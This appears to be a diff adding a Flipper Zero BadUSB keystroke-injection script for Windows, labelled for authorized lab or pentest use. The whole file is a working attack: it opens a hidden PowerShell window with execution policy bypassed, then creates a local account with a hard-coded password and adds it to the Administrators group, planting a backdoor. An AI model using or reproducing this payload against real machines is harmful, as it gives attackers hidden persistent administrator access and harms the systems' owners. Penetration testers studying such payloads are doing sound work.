@@ -1,0 +1,17 @@
+REM ============================================================
+REM Flipper BadUSB — Create local Windows user (PowerShell variant)
+REM Authorized lab / pentest use ONLY
+REM Hidden window; same admin requirement as cmd variant
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 600
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 1200
+STRING net user flipper_user FlipperTemp123! /add; net localgroup Administrators flipper_user /add
+ENTER
+DELAY 600
+STRING exit
+ENTER
